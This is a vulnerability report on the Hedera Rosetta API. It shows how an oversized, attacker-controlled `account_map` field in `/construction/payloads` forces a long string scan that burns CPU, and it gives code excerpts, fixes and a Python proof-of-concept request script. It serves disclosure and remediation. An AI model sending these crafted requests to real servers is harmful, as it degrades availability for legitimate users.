### Title
Unbounded Linear Scan in `getSdkPayerAccountId` via User-Controlled `account_map` Metadata Enables CPU Griefing

### Summary
The `/construction/payloads` endpoint passes `request.Metadata["account_map"]` directly to `getSdkPayerAccountId()` without any size or format validation. An unprivileged caller can supply an arbitrarily large comma-separated `account_map` string, forcing the server to iterate through every entry before reaching a crafted matching alias whose post-colon value is intentionally invalid, causing `hiero.AccountIDFromString(mapping[1])` to fail and return `ErrInvalidAccount` — after burning proportional CPU on every non-matching entry.

### Finding Description

**Exact code path:**

`ConstructionPayloads` (line 243) passes the raw user-supplied metadata field directly into `getSdkPayerAccountId`:

```go
// rosetta/app/services/construction_service.go:243
payer, rErr := c.getSdkPayerAccountId(signers[0], request.Metadata[metadataKeyAccountMap])
```

Inside `getSdkPayerAccountId` (lines 491–500), the only guards are a nil check and a type assertion. After those, the entire comma-separated string is iterated with no length cap:

```go
for aliasMap := range strings.SplitSeq(accountMap, ",") {   // line 491 – unbounded
    if !strings.HasPrefix(aliasMap, payerAlias) {
        continue                                              // line 493 – skips non-matching
    }
    mapping := strings.Split(aliasMap, ":")
    if payer, err = hiero.AccountIDFromString(mapping[1]); err != nil {
        return zero, errors.ErrInvalidAccount                // line 499 – error after full scan
    }
    break
}
```

**Root cause / failed assumption:** The server assumes `account_map` was produced by its own `resolveAccountAliases()` (line 585), which generates a short, trusted `"alias:shard.realm.num"` string. However, `ConstructionPayloads` accepts the field verbatim from the HTTP request body with no re-validation, so the attacker bypasses `resolveAccountAliases()` entirely.

**Exploit flow:**
1. Attacker identifies (or controls) a valid alias-based payer account, e.g. `payerAlias = "0.0.AAAQEAYEAUDAOCAJCAIREEYUCULBOGAZ"`.
2. Attacker crafts a request body for `POST /construction/payloads` with:
   ```json
   {
     "metadata": {
       "account_map": "junk1:0.0.1,junk2:0.0.2,...,junk100000:0.0.100000,0.0.AAAQEAYEAUDAOCAJCAIREEYUCULBOGAZ:INVALID",
       "node_account_id": "0.0.3",
       "valid_start_nanos": "123456789000000000"
     },
     ...
   }
   ```
3. Server iterates all 100 001 entries; the first 100 000 fail the `HasPrefix` check and are skipped; the last one matches.
4. `hiero.AccountIDFromString("INVALID")` fails → `ErrInvalidAccount` is returned.
5. Attacker repeats at high concurrency.

**Why existing checks are insufficient:**
- The nil check (line 480) and type assertion (line 484) only confirm the field is a non-nil string — they impose no bound on its length or entry count.
- There is no authentication or rate-limiting visible in the service layer for this endpoint.
- The `resolveAccountAliases()` guard only runs during `ConstructionMetadata`; `ConstructionPayloads` is a separate, independently callable endpoint.

### Impact Explanation
Each crafted request forces O(n) string prefix comparisons where n is attacker-controlled. With a 1 MB body (a common default HTTP limit) an attacker can pack ~10 000–50 000 entries per request. Sustained concurrent requests can saturate a CPU core with pure string-scanning work, degrading availability of the Rosetta construction API for legitimate users. No funds are at risk and no state is mutated; the impact is service degradation (griefing / availability).

### Likelihood Explanation
The endpoint requires no authentication and is reachable by any network peer. The attack requires only an HTTP client and knowledge of any valid alias string (which the attacker can derive from their own account or from public chain data). It is trivially scriptable and repeatable with zero cost to the attacker.

### Recommendation
1. **Enforce a maximum entry count / byte length** on `account_map` before entering the loop — e.g., reject strings exceeding a small constant (e.g., 10 entries or 4 KB).
2. **Validate format eagerly**: before iterating, split once and verify each token matches `alias:shard.realm.num` with a regex or structured parse; reject the request immediately on any malformed entry.
3. **Add bounds check on `mapping`**: `strings.Split(aliasMap, ":")` can return a slice of length 1 if no colon is present; accessing `mapping[1]` unconditionally will panic. Guard with `if len(mapping) < 2`.
4. Consider **server-side signing of the `account_map`** (e.g., HMAC) so `ConstructionPayloads` can verify the value was produced by `ConstructionMetadata` and not forged.

### Proof of Concept

```python
import requests, json

ALIAS = "0.0.AAAQEAYEAUDAOCAJCAIREEYUCULBOGAZ"   # any valid alias-based payer
N = 50_000

# Build a large account_map: N non-matching entries + 1 matching with invalid account id
entries = [f"junk{i}:0.0.{i}" for i in range(N)]
entries.append(f"{ALIAS}:NOT_A_VALID_ACCOUNT_ID")
account_map = ",".join(entries)

payload = {
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "operations": [
        {"operation_identifier": {"index": 0},
         "type": "CRYPTOTRANSFER",
         "account": {"address": ALIAS},
         "amount": {"value": "-100", "currency": {"symbol": "HBAR", "decimals": 8}}}
    ],
    "metadata": {
        "account_map": account_map,
        "node_account_id": "0.0.3",
        "valid_start_nanos": "1700000000000000000"
    }
}

r = requests.post("http://<rosetta-host>:5700/construction/payloads",
                  json=payload, timeout=30)
# Expected: server burns CPU scanning 50 000 entries, then returns ErrInvalidAccount
print(r.status_code, r.json())
```
